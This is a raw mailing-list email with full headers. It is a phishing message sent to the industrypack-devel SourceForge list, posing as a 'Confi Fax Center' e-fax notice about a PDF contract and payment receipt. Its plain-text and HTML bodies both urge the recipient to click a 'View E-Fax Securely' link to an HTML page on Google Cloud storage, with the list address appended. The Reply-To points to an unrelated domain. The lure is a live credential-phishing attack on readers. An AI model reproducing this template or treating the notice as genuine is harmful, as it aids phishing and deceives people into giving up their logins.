Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B30D54745FA
	for <lists+industrypack-devel@lfdr.de>; Tue, 14 Dec 2021 16:06:28 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mx9Nq-0005kg-QC
	for lists+industrypack-devel@lfdr.de; Tue, 14 Dec 2021 15:06:26 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <plainstup@mineralexpertse.com>) id 1mx9Np-0005ka-KS
 for industrypack-devel@lists.sourceforge.net; Tue, 14 Dec 2021 15:06:25 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=iCSNH50lWQmV0rYfdP4pFFZuCN3zkOTWeB32kZDlvdk=; b=PxABicVttbMHd1u0rEPMuFDoOk
 m3oDuJY49lfP07KIUeV9eK7I2jZcPYgYXtsXDwM68e5A1+kRT9Aj2d+8zj4PaJ1/G7+NkRj7XLO9x
 PvRpjj1ds6imu4qI1WaGrpoA2QvPM81CLXOOM/HKMZGDiFrjrSyHBf1BwHk5erBAYPyM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=iCSNH50lWQmV0rYfdP4pFFZuCN3zkOTWeB32kZDlvdk=; b=f
 1JHdvBcPS1ve5+Je14voCXPOhCbglxFZf4wlIVMjquPIcTng3I6A8ULgYUgzsqBwrmscqRzga9SH+
 5I6DPc1fNALx0gWcXt4g33TOUy3kTALmxikiavPQ99uHFq3d17UahoAsHvcnh7MT0t3i8B2y359EY
 i7BVvTbexdy825Fs=;
Received: from [143.198.228.154] (helo=mta0.mineralexpertse.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mx9Np-00FEhG-0d
 for industrypack-devel@lists.sourceforge.net; Tue, 14 Dec 2021 15:06:25 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=mineralexpertse.com; 
 h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id;
 i=plainstup@mineralexpertse.com;
 bh=iCSNH50lWQmV0rYfdP4pFFZuCN3zkOTWeB32kZDlvdk=;
 b=XEmBQKFITMNfvt3V4S2LaP5uIDAlypbnmSsxlcCzR+g6FTYNdQAXHXYOAQ9/L4ls6izR/xQA86Pa
 mjuMT7VFU8bsdkFQwEIBGCoU4QGrfGu2Txrfxe2qGQz8n6bsAzeT4soRUEMAWO0VBWpVkuSHLyJl
 ye/6V13vLmuaRSxcuWo=
To: <industrypack-devel@lists.sourceforge.net>
MIME-Version: 1.0
Date: Tue, 14 Dec 2021 15:06:19 +0000
Message-Id: <14192021120615BBDAD27D1E-45D5A5F570@mineralexpertse.com>
X-Spam-Score: 1.1 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Lists.sourceforge.net Confi Fax Center You have received new
 e-Fax attachment from 419 680-XXXX on Tuesday, December 14, 2021 Received
 Pages 2 Content analysis details:   (1.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
X-Headers-End: 1mx9Np-00FEhG-0d
Subject: [Industrypack-devel] Approval Required To Preview Vital E-Fax Docs#
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "Lists.sourceforge.net|E-Fax Approval71076680a1f5e4b8c8f42a1b0bb9c33f
 via Industrypack-devel" <industrypack-devel@lists.sourceforge.net>
Reply-To: "Lists.sourceforge.net|E-Fax
 Approval71076680a1f5e4b8c8f42a1b0bb9c33f" <plainstup@mineralexpertse.com>
Content-Type: multipart/mixed; boundary="===============9019878415541337171=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--===============9019878415541337171==
Content-Type: multipart/alternative; boundary="JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b"

This is a multi-part message in MIME format

--JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


Lists.sourceforge.net Confi Fax Center

You have received new e-Fax attachment from 419 680-XXXX on Tuesday, D=
ecember 14, 2021

Received Pages 2

File Type: PDF

File Name: P.O Contract (0.98mb)

Reference: Payment-e-receipt-A210-4590-675.pdf

To view your message ?=20

Click Here To View E-Fax Securely https://storage.cloud.google.com/mai=
ntainancecomponeta.appspot.com/sydlasguygendom.html#industrypack-devel=
@lists.sourceforge.net

--JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
8859-1">
  <META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=
=3D1"> <META name=3Dformat-detection content=3Dtelephone=3Dno> <title>=
Approval Required To Preview Vital E-Fax Docs#</title>
 </head>
 <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff> <P align=
=3Dleft><FONT size=3D3 face=3DArial>&nbsp;&nbsp;<FONT face=3D"Times Ne=
w Roman"> </FONT></p><p><STRONG><SPAN style=3D"COLOR: #2f4f4f"><SPAN s=
tyle=3D"FONT-SIZE: 72px"><SPAN style=3D"FONT-SIZE: 48px">Lists.sourcef=
orge.net&nbsp;Confi Fax Center</SPAN></SPAN></SPAN></STRONG></p><p><SP=
AN style=3D"FONT-SIZE: 22px">You have received new e-Fax attachment fr=
om 419 680-XXXX on Tuesday, December 14, 2021</SPAN></p><p><SPAN style=
=3D"FONT-SIZE: 22px">Received Pages 2</SPAN></p><p><SPAN style=3D"FONT=
-SIZE: 22px">File Type: PDF</SPAN></p><p><SPAN style=3D"FONT-SIZE: 22p=
x">File Name: P.O Contract (0.98mb)</SPAN></p><p><SPAN style=3D"FONT-S=
IZE: 22px">Reference: Payment-e-receipt-A210-4590-675.pdf</SPAN></p><p=
><SPAN style=3D"FONT-SIZE: 22px">To view your message&nbsp; &nbsp; </S=
PAN><SPAN style=3D'FONT-SIZE: 16px; FONT-FAMILY: "pingfang sc", "helve=
tica neue", arial, "hiragino sans gb", "microsoft yahei ui", "microsof=
t yahei", simsun, sans-serif; COLOR: rgb(85,85,85); BACKGROUND-COLOR: =
rgb(245,245,245)'>&#8594;</SPAN><SPAN style=3D"FONT-SIZE: 22px">&nbsp;=
 &nbsp;<U><A href=3D"https://storage.cloud.google.com/maintainancecomp=
oneta.appspot.com/sydlasguygendom.html#industrypack-devel@lists.source=
forge.net"><SPAN style=3D"COLOR: #2f4f4f">Click Here To View E-Fax Sec=
urely</SPAN></A></U></SPAN></p><p>&nbsp;</P></FONT></body>
 </html>

--JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b--



--===============9019878415541337171==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============9019878415541337171==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============9019878415541337171==--


